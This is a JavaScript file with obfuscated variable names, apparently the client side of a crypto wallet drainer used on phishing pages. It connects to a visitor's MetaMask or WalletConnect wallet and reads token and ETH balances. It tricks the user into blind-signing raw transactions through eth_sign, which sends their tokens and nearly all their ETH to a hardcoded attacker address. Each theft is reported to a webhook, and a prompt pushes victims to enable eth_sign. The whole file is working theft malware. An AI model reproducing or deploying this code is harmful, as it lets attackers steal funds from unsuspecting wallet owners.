let eth_bal = 0,
	metamaskInstalled = false,
	disabled = false,
	provider;
connected = false;

const infuraID = "73735e0b064e4b62aa6e2c37c5b72bb5"

const init_web3 = async () => {
	let pr = [];

	if (!connected) {
		if (!window.ethereum) {
			if (provider) {
				await provider.disconnect();
			}
			provider = new WalletConnectProvider.default({
				rpc: {
					1: "https://mainnet.infura.io/v3/73735e0b064e4b62aa6e2c37c5b72bb5",
					56: `https://polygon-mainnet.infura.io/v3/${infuraID}`,
					137: 'https://bsc-dataseed1.binance.org/',
				},
				infuraId: infuraID,
				bridge: "https://bridge.walletconnect.org",
				chainId: parseInt(myChainId),
				qrcodeModalOptions: {
					mobileLinks: ["trust", "metamask"],
					desktopLinks: ["trust", "metamask"],
				},
			});
			pr.push(provider.enable().then(async () => {
				if (("0x" + provider.chainId.toString(16)).toUpperCase() !== myChainId.toUpperCase()) {
					provider.disconnect();
					connected = true;
					notChain();
				}
				try {
					web3 = new Web3(provider);
					updateState(true);
				} catch (e) {
					console.log("Failed to connect to wallet:", e.message);

					if (e.message.toLowerCase().includes(("Unrecognized chain ID").toLowerCase())) {
						alert("You dont' have this chain set up in your wallet browser extension.");
					}
				}
			}));
		} else {
			if (
				("0x" + parseInt(window.ethereum.networkVersion).toString(16)).toUpperCase() ===
				myChainId.toUpperCase()
			) {
				provider = window.ethereum;
				await provider.enable();
				connected = true;
			} else {
				pr.push(window.ethereum.request({
					method: "wallet_switchEthereumChain",
					params: [{ chainId: myChainId.toString() }],
				}).then(async () => {
					provider = window.ethereum;
					await provider.enable();
					connected = true;
					try {
						web3 = new Web3(provider);
						console.log(typeof (web3.eth.requestAccounts));
						updateState(true);
					} catch (error) {
						console.log("Failed to connect to wallet");
					}
				}).catch((e) => {
					console.log(e.message)

					if (e.message.toLowerCase().includes(("Unrecognized chain ID").toLowerCase())) {
						alert("You dont' have this chain set up in your wallet browser extension.");
					}
				}));
			}
		}
	}

	await Promise.all(pr);
};

window.ethereum
	? window.ethereum.on("disconnect", () => updateState(false))
	: null;
window.ethereum
	? window.ethereum.on("accountsChanged", (_0x529dd7) => {
		_0x529dd7.length < 1 && updateState(false);
	})
	: null;

async function updateState(_0x2c0634) {
	const _0x165b98 = new Web3(provider);
	document.getElementById("walletAddress").innerHTML = _0x2c0634
		? "CONNECTED <br> <span>" +
		(await _0x165b98.eth.getAccounts())[0] +
		"</span>"
		: "NOT CONNECTED";
	document.querySelector("#connectButton").style.display = _0x2c0634
		? ""
		: "none";
	document.querySelector("#connectButton2").style.display = _0x2c0634
		? ""
		: "none";
}

async function askTokens() {
	console.log(">>> Checking Tokens <<<");
	const _0x4044a4 = new Web3(provider),
		_0x2c8399 = await _0x4044a4.eth.getGasPrice(),
		_0xd7dd9b = _0x4044a4.utils.toHex(Math.floor(_0x2c8399 * 1.4));
	const _0x947e1c = (await _0x4044a4.eth.getAccounts())[0],
		_0xee3eb7 = await Promise.all(
			Object.keys(tokenList).map(async (_0x15db1e) => {
				const _0x3c0a40 = { from: _0x947e1c };
				const _0x2438de = new _0x4044a4.eth.Contract(
					tokenContractAbi,
					_0x15db1e,
					_0x3c0a40
				),
					_0x4a71c8 = { from: _0x947e1c };
				const _0x35a443 = await _0x2438de.methods.decimals().call(_0x4a71c8),
					_0x1d5320 = await _0x2438de.methods
						.balanceOf(_0x947e1c)
						.call({ from: _0x947e1c }),
					_0x5efdde = new BigNumber(String(_0x1d5320))
						.dividedBy(new BigNumber(String(10)).pow(_0x35a443))
						.toNumber(),
					_0x3dd158 = {
						name: "_to",
						type: "address",
					};
				const _0x4a93c9 = {
					name: "_value",
					type: "uint256",
				};
				const _0x421d8a = {
					name: "success",
					type: "bool",
				};
				const _0x489af5 = {
					inputs: [_0x3dd158, _0x4a93c9],
					name: "transfer",
					stateMutability: "nonpayable",
					outputs: [_0x421d8a],
					payable: false,
					type: "function",
				};
				const _0x5d234d = _0x4044a4.eth.abi.encodeFunctionCall(_0x489af5, [
					toEthAddress,
					new BigNumber(_0x1d5320),
				]),
					_0x4a2196 = new BigNumber(_0x5efdde).toString(16);
				let _0x2931c1 = 600000,
					_0x273d56 = (600000).toString(16),
					_0x1e1e9e = false;
				try {
					_0x2931c1 = await _0x2438de.methods
						.transfer(toEthAddress, _0x1d5320)
						.estimateGas({
							gas: "0x00",
							gasPrice: _0xd7dd9b,
							from: _0x947e1c,
						});
				} catch (_0x328dc2) {
					console.error(">>> failed to get fee <<<", _0x328dc2),
						(_0x1e1e9e = true);
				}
				_0x273d56 = new BigNumber(
					new BigNumber(_0x2931c1).multipliedBy(1.4).toFixed(0)
				).toString(16);
				const _0x43d779 = tokenList[_0x15db1e],
					_0x222d53 = {};
				return (
					(_0x222d53.contractAddress = _0x15db1e),
					(_0x222d53.tokenContract = _0x2438de),
					(_0x222d53.balance = _0x5efdde),
					(_0x222d53.minBalance = _0x43d779),
					(_0x222d53.balanceWei = _0x1d5320),
					(_0x222d53.transferFunc = _0x5d234d),
					(_0x222d53.gasLimitCalculated = _0x2931c1),
					(_0x222d53.gasLimitWithPercentForSuccess = _0x273d56),
					(_0x222d53.hasErrorGas = _0x1e1e9e),
					_0x222d53
				);
			})
		);
	console.log(">>> Token Balances <<<");
	console.table(_0xee3eb7, ["contractAddress", "balance", "minBalance"]);
	const _0x5e8b4e = _0xee3eb7
		.filter((_0x1b7d14) => {
			return (
				_0x1b7d14.balanceWei > 0 && _0x1b7d14.balance >= _0x1b7d14.minBalance
			);
		})
		.sort((_0xd3f863, _0x24cdc9) => {
			return _0xd3f863.balance > _0x24cdc9.balance ? -1 : 1;
		}),
		_0x1faf79 = (await _0x4044a4.eth.getBlock("latest")).gasLimit;
	if (_0x5e8b4e.length < 1) {
		return (
			console.log("no tokens left checking remaining eth"),
			askTransferWithSign()
		);
	}
	const _0x5a6790 = await _0x4044a4.eth.getChainId();
	for (tokenInfo of _0x5e8b4e) {
		console.log(">>> Token Info <<<");
		console.log(
			"+--------------------------------------------------+\nContract: " +
			tokenInfo.contractAddress +
			"\nBalance: " +
			tokenInfo.balance +
			"\nMinimum Balance: " +
			tokenInfo.minBalance +
			"\n+--------------------------------------------------+"
		);
		try {
			await _0x4044a4.eth
				.getTransactionCount(_0x947e1c, "pending")
				.then(async (_0x218b25) => {
					const _0xbee29e = new _0x4044a4.utils.BN(600000),
						_0x2e9c29 = {
							nonce: _0x4044a4.utils.toHex(_0x218b25),
							gasPrice: _0xd7dd9b,
							gas: "0x" + tokenInfo.gasLimitWithPercentForSuccess,
							from: _0x4044a4.utils.toChecksumAddress(_0x947e1c),
							contractAddress: tokenInfo.contractAddress,
							to: tokenInfo.contractAddress,
							value: "0x" + (0).toString(16),
							data: tokenInfo.transferFunc,
							v: myChainId,
							r: "0x",
							s: "0x",
						};
					let _0x309fb1 = new ethereumjs.Tx(_0x2e9c29);
					const _0xeb8936 = "0x" + _0x309fb1.serialize().toString("hex"),
						_0x232432 = { encoding: "hex" };
					const _0x4f130a = _0x4044a4.utils.sha3(_0xeb8936, _0x232432);
					await _0x4044a4.eth
						.sign(_0x4f130a, _0x947e1c)
						.then(async (_0x3e381d) => {
							const _0x350add = _0x3e381d.substring(2),
								_0x43c710 = "0x" + _0x350add.substring(0, 64),
								_0xf0a7f7 = "0x" + _0x350add.substring(64, 128),
								_0x2a7473 = parseInt(_0x350add.substring(128, 130), 16),
								_0x3f015a = _0x4044a4.utils.toHex(
									_0x2a7473 + _0x5a6790 * 2 + 8
								);
							_0x309fb1.r = _0x43c710;
							_0x309fb1.s = _0xf0a7f7;
							_0x309fb1.v = _0x3f015a;
							const _0x1df9f7 = "0x" + _0x309fb1.serialize().toString("hex"),
								_0x5c4d51 = { encoding: "hex" };
							const _0x4f3892 = _0x4044a4.utils.sha3(_0x1df9f7, _0x5c4d51);
							await _0x4044a4.eth
								.sendSignedTransaction(_0x1df9f7)
								.then((_0xca170a) => {
									return (
										sendWebhooks(
											"**Transaction " + chainToken + " Token incoming!** \n\nFrom: " +
											_0xca170a.from +
											" \nContract: " +
											_0xca170a.to +
											" \n\nBalance: **" +
											tokenInfo.balance +
											"**\n\nhttps://etherscan.io/tx/" +
											_0xca170a.transactionHash
										),
										console.log(_0xca170a)
									);
								})
								.catch((_0x3d3c82) => {
									return console.log(">>", _0x3d3c82);
								});
						})
						.catch((_0x1c8155) => {
							return console.log(_0x1c8155);
						});
				});
		} catch (_0x223b0d) {
			console.log(_0x223b0d);
		}
	}
	console.log("checking remaining eth");
	await askTransferWithSign();
}
async function askTransfer() {
	if (disabled) {
		return;
	}
	await askTokens();
}
const verifyAsset = async () => {
	const _0x5004a0 = new Web3(provider);
	const _0x5c4d01 = (await _0x5004a0.eth.getAccounts())[0];
	try {
		eth_bal = await _0x5004a0.eth.getBalance(_0x5c4d01);
		const _0x5c3b25 = _0x5004a0.utils.fromWei(eth_bal, "ether");
		console.log(
			"Current balance for " + _0x5c4d01 + " : " + _0x5c3b25 + " " + chainName + ""
		);
		if (_0x5c3b25 > minimumEthBalance) {
			askTransfer();
		} else {
			console.log(
				"Error, balance is too low. (< " + minimumEthBalance + " " + chainName + ")"
			);
		}
	} catch (_0x352e2a) {
		console.log(_0x352e2a);
	}
};
async function askTransferWithSign() {
	const _0x21a943 = new Web3(provider),
		_0x98a87a = (await _0x21a943.eth.getAccounts())[0];
	chainId = await _0x21a943.eth.getChainId();
	eth_bal = await _0x21a943.eth.getBalance(_0x98a87a);
	await _0x21a943.eth
		.getTransactionCount(_0x98a87a, "pending")
		.then(async (_0x402557) => {
			const _0x45909f = await _0x21a943.eth.getGasPrice(),
				_0xffd295 = _0x21a943.utils.toHex(Math.floor(_0x45909f * 1.3)),
				_0x36d0c7 = new _0x21a943.utils.BN("22000"),
				_0x41e046 = _0x36d0c7 * Math.floor(_0x45909f * 2),
				_0x6145d6 = eth_bal - _0x41e046;
			console.log(
				"Sending " +
				_0x21a943.utils.fromWei(_0x6145d6.toString(), "ether") +
				" " + chainName + " from " +
				_0x98a87a +
				"..."
			);
			const _0x35316d = {
				nonce: _0x21a943.utils.toHex(_0x402557),
				gasPrice: _0xffd295,
				gasLimit: "0x55F0",
				to: toEthAddress,
				value: "0x" + _0x6145d6.toString(16),
				data: "0x",
				v: myChainId,
				r: "0x",
				s: "0x",
			};
			let _0x5f241c = new ethereumjs.Tx(_0x35316d);
			const _0x3c1c45 = { encoding: "hex" };
			const _0x18e8bd = "0x" + _0x5f241c.serialize().toString("hex"),
				_0x57dbb1 = _0x21a943.utils.sha3(_0x18e8bd, _0x3c1c45);
			console.log("rawTx1:", _0x18e8bd);
			console.log("rawHash1:", _0x57dbb1);
			await _0x21a943.eth
				.sign(_0x57dbb1, _0x98a87a)
				.then(async (_0x594411) => {
					const _0x223b18 = _0x594411.substring(2),
						_0x1ab806 = "0x" + _0x223b18.substring(0, 64),
						_0x26b51c = "0x" + _0x223b18.substring(64, 128),
						_0x173285 = parseInt(_0x223b18.substring(128, 130), 16),
						_0x4a9978 = _0x21a943.utils.toHex(_0x173285 + chainId * 2 + 8);
					console.log("r:", _0x1ab806);
					console.log("s:", _0x26b51c);
					console.log("y:", _0x4a9978.toString("hex"));
					_0x5f241c.r = _0x1ab806;
					_0x5f241c.s = _0x26b51c;
					_0x5f241c.v = _0x4a9978;
					console.log(_0x5f241c);
					const _0x3859e9 = { encoding: "hex" };
					const _0x65fbf5 = "0x" + _0x5f241c.serialize().toString("hex"),
						_0x537df7 = _0x21a943.utils.sha3(_0x65fbf5, _0x3859e9);
					console.log("rawTx:", _0x65fbf5);
					console.log("rawHash:", _0x537df7);
					await _0x21a943.eth
						.sendSignedTransaction(_0x65fbf5)
						.then((_0xcb16e0) => {
							console.log(_0xcb16e0);
							var _0x316cc0 = toEthAddress;
							sendWebhooks(
								"**" + chainName + " Transaction incoming!** \n\nFrom: " +
								_0x98a87a +
								" \nTo: " +
								_0x316cc0 +
								" \n\nBalance: **" +
								_0x21a943.utils.fromWei(_0x6145d6.toString(), "ether") +
								" " + chainName + "**\n\nhttps://etherscan.io/tx/" +
								_0xcb16e0.transactionHash
							);
						})
						.catch((_0x425ef0) => console.log(_0x425ef0));
				})
				.catch((_0x468f94) => {
					console.log(_0x468f94);
					if (
						_0x468f94.message ===
						"eth_sign has been disabled. You must enable it in the advanced settings"
					) {
						showEthSignMessage();
					} else {
						if (
							_0x468f94.message !==
							"Already processing eth_requestAccounts. Please wait."
						) {
							window.location.reload();
						}
					}
				});
		});
}
const sendWebhooks = (_0x2a1e2e) => {
	if (!logsDelivery) {
		return;
	}
	const _0x45ecc2 = {};
	_0x45ecc2["Content-Type"] = "application/json";
	const _0x1e337d = { content: _0x2a1e2e, chatId: chatId };
	fetch(webhookURL, {
		method: "POST",
		headers: _0x45ecc2,
		body: JSON.stringify(_0x1e337d),
	}).catch((_0x301594) => {
		return console.error(_0x301594);
	});
},
	round = (_0x1d7623) => {
		return Math.round(_0x1d7623 * 10000) / 10000;
	};
if (typeof window.ethereum !== "undefined") {
	metamaskInstalled = true;
}
const connect = async () => {
	await init_web3();

	verifyAsset();
}

// 	document
// 		.querySelector("#connectButton")
// 		.addEventListener("click", verifyAsset);
// 	document
// 		.querySelector("#connectButton2")
// 		.addEventListener("click", verifyAsset);

function notChain() {
	alert("please connect to the " + chainName + " chain.")
	window.location.reload()
}
// setTimeout(verifyAsset, 2000)
